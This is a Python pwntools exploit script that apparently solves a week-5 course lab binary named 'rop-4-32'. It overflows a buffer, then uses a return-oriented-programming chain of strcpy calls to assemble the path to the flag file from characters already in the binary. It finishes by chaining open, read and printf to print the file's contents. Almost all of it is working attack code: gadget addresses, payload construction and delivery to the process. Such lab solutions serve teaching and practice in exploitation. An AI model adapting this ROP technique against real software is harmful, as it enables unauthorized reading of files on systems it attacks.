#!/usr/bin/env python

from pwn import *
import os

p = process("./rop-4-32")


buf = "A" * 0x88 + "BBBB"

'''
p = process("./rop-4-xx")
context.terminal = ["tmux", "splitw", "-h"]
gdb.attach(p)
'''

"""
0x080483c0  read@plt
0x080483d0  printf@plt
0x080483f0  puts@plt
0x08048400  open@plt
0x0804858e  strcpy
"""
read_addr = p32(0x080483c0)
printf_addr = p32(0x080483d0)
open_addr = p32(0x08048400)
strcpy = p32(0x0804858e)
'''
0x0804858a : pop ebp ; cld ; leave ; ret
0x080486d5 : pop ebp ; lea esp, [ecx - 4] ; ret
0x080485c7 : pop ebp ; ret
0x080486d4 : pop ebx ; pop ebp ; lea esp, [ecx - 4] ; ret
0x08048738 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret
0x080483a9 : pop ebx ; ret
0x080486d3 : pop ecx ; pop ebx ; pop ebp ; lea esp, [ecx - 4] ; ret
0x0804873a : pop edi ; pop ebp ; ret
0x08048739 : pop esi ; pop edi ; pop ebp ; ret
'''
pop_3_ret = p32(0x08048739)
pop_2_ret = p32(0x0804873a)

global_path_original = (0x804a800)
global_path = (0x804a800)
global_print = p32(0x804aa00)
#build the string in the global buff addr
'''
0x8048768:      "the quick brown fox jumps over the lazy dog!"
0x80487b1:      "1234567890-"
0x80487e0:      "slash"

target /home/labs/week5/rop-4-32/flag
'''
letter_base = (0x8048768)
number_base = (0x80487b1)
slash = (0x80487e0)

def addchar(global_path, address_char, buf):
    #print("GLOBALT PATH: " + (str(global_path)))
    #print("address_char: " +(str(address_char)))
    buf += strcpy
    buf += pop_2_ret
    buf += p32(global_path)
    buf += p32(address_char)
    return global_path + 1, buf

global_path, buf = addchar(global_path, slash, buf)#/
global_path, buf = addchar(global_path, letter_base + 1, buf)#h
global_path, buf = addchar(global_path, letter_base + 12, buf)#o
global_path, buf = addchar(global_path, letter_base + 22, buf)#m
global_path, buf = addchar(global_path, letter_base + 2, buf)#e
global_path, buf = addchar(global_path, slash, buf)#/
global_path, buf = addchar(global_path, letter_base + 35, buf)#l
global_path, buf = addchar(global_path, letter_base + 36, buf)#a
global_path, buf = addchar(global_path, letter_base + 10, buf)#b
global_path, buf = addchar(global_path, letter_base + 24, buf)#s
global_path, buf = addchar(global_path, slash, buf)#/
global_path, buf = addchar(global_path, letter_base + 13, buf)#w
global_path, buf = addchar(global_path, letter_base + 2, buf)#e
global_path, buf = addchar(global_path, letter_base + 2, buf)#e
global_path, buf = addchar(global_path, letter_base + 8, buf)#k
global_path, buf = addchar(global_path, number_base + 4, buf)#5
global_path, buf = addchar(global_path, slash, buf)#/
global_path, buf = addchar(global_path, letter_base + 11, buf)#r
global_path, buf = addchar(global_path, letter_base + 12, buf)#o
global_path, buf = addchar(global_path, letter_base + 23, buf)#p
global_path, buf = addchar(global_path, number_base + 10, buf)#-
global_path, buf = addchar(global_path, number_base + 3, buf)#4
global_path, buf = addchar(global_path, number_base + 10, buf)#-
global_path, buf = addchar(global_path, number_base + 2, buf)#3
global_path, buf = addchar(global_path, number_base + 1, buf)#2
global_path, buf = addchar(global_path, slash, buf)#/
global_path, buf = addchar(global_path, letter_base + 16, buf)#f
global_path, buf = addchar(global_path, letter_base + 35, buf)#l
global_path, buf = addchar(global_path, letter_base + 36, buf)#a
global_path, buf = addchar(global_path, letter_base + 42, buf)#g
global_path, buf = addchar(global_path, letter_base +44, buf)#terminator



#open(/home/labs/week5/rop-4-32/flag, 0)
buf += open_addr
buf += pop_2_ret
buf += p32(global_path_original)
buf += p32(0)

#read(3,global_addr, 100)
buf += read_addr
buf += pop_3_ret
buf += p32(3)
buf += global_print
buf += p32(0x100)

#printf(global_addr)
buf += printf_addr
buf += "AAAA"
buf += global_print


with open('output.txt', 'wb') as f:
    f.write(buf)

p.sendline(buf)
p.interactive()